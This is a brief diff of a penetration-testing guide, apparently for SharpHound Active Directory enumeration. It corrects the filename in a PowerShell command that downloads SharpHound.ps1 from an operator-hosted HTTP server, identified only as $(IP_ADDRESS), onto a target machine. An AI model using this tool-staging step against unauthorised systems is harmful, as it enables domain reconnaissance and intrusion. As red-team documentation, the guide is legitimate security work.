@@ -7,7 +7,7 @@ https://github.com/SpecterOps/SharpHound/releases
 python3 -m http.server
 ```
 ```powershell
-iwr -uri http://$(IP_ADDRESS)/sharphound.ps1 -OutFile sharphound.ps1
+iwr -uri http://$(IP_ADDRESS)/SharpHound.ps1 -OutFile SharpHound.ps1
 ```
 ### Step 2: Import Sharphound module
 ```powershell
